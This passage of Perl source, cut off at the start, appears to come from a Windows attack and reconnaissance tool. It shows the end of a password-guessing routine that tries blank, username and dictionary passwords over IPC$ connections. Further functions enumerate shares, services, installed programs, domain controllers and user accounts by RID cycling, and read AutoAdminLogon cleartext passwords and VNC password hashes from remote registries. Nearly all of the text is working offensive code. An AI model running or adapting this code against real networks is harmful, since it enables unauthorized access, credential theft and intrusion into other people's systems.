							last;
						}
						else
						{
							print ".";
						}
					}
				}
			}
		}

		close(DICT);
	}
	else
	{
		if (&Connect($strTarget, $strUsername, ""))
		{
			$strResult = "$strUsername,#BLANK#";

			print "!";

			Disconnect($strTarget);
		}
		else
		{
			print ".";

			$strLCUsername = lc($strUsername);

			if (&Connect($strTarget, $strUsername, $strLCUsername))
			{
				$strResult = "$strUsername,$strLCUsername";

				print "!";

				Disconnect($strTarget);
			}
			else
			{
				print ".";
			}
		}
	}

	&Connect($strTarget, $strIPCUsername, $strIPCPassword);

	return $strResult;
}

sub GetShares()
{
	my($strTarget) = @_;
	my(@strShares) = ();
	my($strShare)  = "";
	my($i)         = "";
	my(@strResult) = ();

	if (Win32::Lanman::NetShareEnum("\\\\$strTarget", \@strShares))
	{
		$i = 0;

		foreach $strShare (@strShares)
		{
			$strResult[$i] = "${$strShare}{'netname'}";

			$i = $i + 1;
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetOSVersion()
{
	my($strTarget) = @_;
	my($objHKLM)   = "";
	my(@strResult) = ();

	if ($objHKLM = $Registry->Connect("$strTarget", "LMachine\\"))
	{
		$strResult[0] = $objHKLM->{"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\\CurrentVersion"};
		$strResult[1] = $objHKLM->{"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\\CSDVersion"};
	}

	if ($strResult[0] eq "")
	{
		$strResult[0] = "FALSE";
	}

	return @strResult;
}

sub GetServices()
{
	my($strTarget)         = @_;
	my(@objServices)       = ();
	my($i)                 = "";
	my($objService)        = "";
	my(%objConfig)         = ();
	my($strServiceAccount) = "";
	my(@strResult)         = ();

	if (Win32::Lanman::EnumServicesStatus("\\\\$strTarget", "", &SERVICE_WIN32, &SERVICE_STATE_ALL, \@objServices))
	{
		$i = 0;

		foreach $objService (@objServices)
		{
			if (Win32::Lanman::QueryServiceConfig("\\\\$strTarget", "", ${$objService}{'name'}, \%objConfig))
			{
				if ($objConfig{'account'} !~ /LocalSystem/ && $objConfig{'account'} !~ /LocalService/ && $objConfig{'account'} !~ /NetworkService/)
				{
					$strServiceAccount = "($objConfig{'account'})";
				}

				if (${$objService}{'state'} eq "4")
				{
					$strResult[$i] = "${$objService}{'display'} $strServiceAccount,Started";
				}
				else
				{
					$strResult[$i] = "${$objService}{'display'} $strServiceAccount,Stopped";
				}

				$strServiceAccount = "";

				$i = $i + 1;
			}
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub GetInstalledPrograms()
{
	my($strTarget)          = @_;
	my($objHKLM)            = "";
	my($objUninstall)       = "";
	my(@strPrograms)        = ();
	my($strProgram)         = "";
	my($strCurrentProgram)  = "";
	my($strSystemComponent) = "";
	my($i)                  = "";
	my(@strResult)          = ();

	if ($objHKLM = $Registry->Connect("$strTarget", "LMachine\\"))
	{
		$objUninstall = $objHKLM->{"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"};

		@strPrograms = $objUninstall->SubKeyNames;

		foreach $strProgram (@strPrograms)
		{
			$strCurrentProgram = $objHKLM->{"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$strProgram\\\\DisplayName"};

			$strSystemComponent = $objHKLM->{"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$strProgram\\\\SystemComponent"};

			if ($strCurrentProgram ne "" && $strSystemComponent eq "")
			{
				$strResult[$i] = $strCurrentProgram;

				$i = $i + 1;
			}

			$strCurrentProgram  = "";
			$strSystemComponent = "";
		}
	}

	if ($strResult[0] eq "")
	{
		$strResult[0] = "FALSE";
	}

	return @strResult;
}

sub GetClosestDC()
{
	my($strTarget) = @_;
	my($strDC)     = "";
	my($strResult) = "";

	if (Win32::Lanman::NetGetAnyDCName("\\\\$strTarget", "", \$strDC))
	{
		$strResult = $strDC;

		return $strResult;
	}
	else
	{
		$strResult = "FALSE";

		return $strResult;
	}
}

sub GetAutoAdminLogonInfo()
{
	my($strTarget) = @_;
	my($objHKLM)   = "";
	my(@strResult) = ();

	if ($objHKLM = $Registry->Connect("$strTarget", "LMachine\\"))
	{
		$strResult[0] = $objHKLM->{"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\DefaultPassword"};
		$strResult[1] = $objHKLM->{"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\DefaultUserName"};
		$strResult[2] = $objHKLM->{"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\DefaultDomainName"};
	}

	if ($strResult[0] eq "")
	{
		$strResult[0] = "FALSE";
	}

	return @strResult;
}

sub GetVNCPassword()
{
	my($strTarget)      = @_;
	my($objHKLM)        = "";
	my($objVNC)         = "";
	my(@strVNCPassword) = ();
	my($strResult)      = "";

	if ($objHKLM = $Registry->Connect("$strTarget", "LMachine\\"))
	{
		$objVNC = $objHKLM->{"SOFTWARE\\ORL\\WinVNC3\\Default\\\\Password"};

		if ($objVNC ne "")
		{
			@strVNCPassword = unpack("H2H2H2H2H2H2H2H2", $objVNC);

			$strResult = "$strVNCPassword[0] $strVNCPassword[1] $strVNCPassword[2] $strVNCPassword[3] $strVNCPassword[4] $strVNCPassword[5] $strVNCPassword[6] $strVNCPassword[7]";
		}

		$objVNC = $objHKLM->{"SOFTWARE\\RealVNC\\WinVNC4\\\\Password"};

		if ($objVNC ne "")
		{
			@strVNCPassword = unpack("H2H2H2H2H2H2H2H2", $objVNC);

			$strResult = "$strVNCPassword[0] $strVNCPassword[1] $strVNCPassword[2] $strVNCPassword[3] $strVNCPassword[4] $strVNCPassword[5] $strVNCPassword[6] $strVNCPassword[7]";
		}
	}

	if ($strResult eq "")
	{
		$strResult = "FALSE";
	}

	return $strResult;
}

sub GetRAUsers()
{
	my($strTarget)   = @_;
	my(%objMachInfo) = ();
	my($i)           = "";
	my($strSID)      = "";
	my($j)           = "";
	my($binSID)      = "";
	my($strAccount)  = "";
	my($strDomain)   = "";
	my($intSIDType)  = "";
	my(@strResult)   = ();

	if (Win32::Lanman::LsaQueryAccountDomainPolicy("\\\\$strTarget", \%objMachInfo))
	{
		$i = 0;

		$strSID = SidToString($objMachInfo{'domainsid'});

		for ($j = 500; $j <= 501; $j++)
		{
			$binSID = StringToSid("$strSID-$j");

			$strAccount = "";
			$strDomain  = "";
			$intSIDType = "";

			Win32::LookupAccountSID("\\\\$strTarget", $binSID, $strAccount, $strDomain, $intSIDType);

			if ($strAccount ne "")
			{
				$strResult[$i] = $strAccount;

				$i = $i + 1;
			}
		}

		$strSID = SidToString($objMachInfo{'domainsid'});

		for ($j = 1000; $j <= 1501; $j++)
		{
			$binSID = StringToSid("$strSID-$j");

			$strAccount = "";
			$strDomain  = "";
			$intSIDType = "";

			Win32::LookupAccountSID("\\\\$strTarget", $binSID, $strAccount, $strDomain, $intSIDType);

			if ($strAccount ne "")
			{
				$strResult[$i] = $strAccount;

				$i = $i + 1;
			}
		}

		return @strResult;
	}
	else
	{
		$strResult[0] = "FALSE";

		return @strResult;
	}
}

sub Disconnect()
{
	my($strTarget) = @_;

	(Win32::Lanman::NetUseDel("\\\\$strTarget\\IPC\$", &USE_LOTS_OF_FORCE)) ? (return 1) : (return 0);
}